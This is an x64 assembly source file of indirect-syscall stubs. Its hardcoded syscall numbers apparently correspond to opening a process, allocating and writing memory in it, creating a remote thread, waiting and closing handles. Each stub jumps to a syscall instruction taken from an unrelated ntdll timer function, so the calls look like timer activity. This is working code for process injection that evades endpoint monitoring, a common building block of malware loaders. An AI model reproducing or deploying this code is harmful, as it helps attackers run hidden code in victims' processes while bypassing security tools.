EXTERN CSSN:DWORD                
EXTERN OPSSN:DWORD          
EXTERN CTSSN:DWORD       
EXTERN WVMSSN:DWORD   
EXTERN WFSOSSN:DWORD  
EXTERN AVMSSN:DWORD

EXTERN NtCreateTimerSyscall:QWORD
EXTERN NtOpenTimerSyscall:QWORD
EXTERN NtSetTimerSyscall:QWORD
EXTERN NtQueryTimerSyscall:QWORD
EXTERN NtCancelTimerSyscall:QWORD

.CODE

OP PROC
		mov r10, rcx
		mov eax, 26h
		jmp qword ptr [NtCreateTimerSyscall]
		ret
OP ENDP

AVM PROC
		mov r10, rcx
		mov eax, 18h
		jmp qword ptr [NtOpenTimerSyscall]
		ret
AVM ENDP

WVM PROC
		mov r10, rcx
		mov eax, 3ah
		jmp qword ptr [NtSetTimerSyscall]
		ret
WVM ENDP

CT PROC
		mov r10, rcx
		mov eax, 0c7h
		jmp qword ptr [NtQueryTimerSyscall]
		ret
CT ENDP

WFSO PROC
		mov r10, rcx
		mov eax, 04h
		jmp qword ptr [NtQueryTimerSyscall]
		ret
WFSO ENDP

C PROC
		mov r10, rcx
		mov eax, 0fh
		jmp qword ptr [NtCancelTimerSyscall]
		ret
C ENDP

end
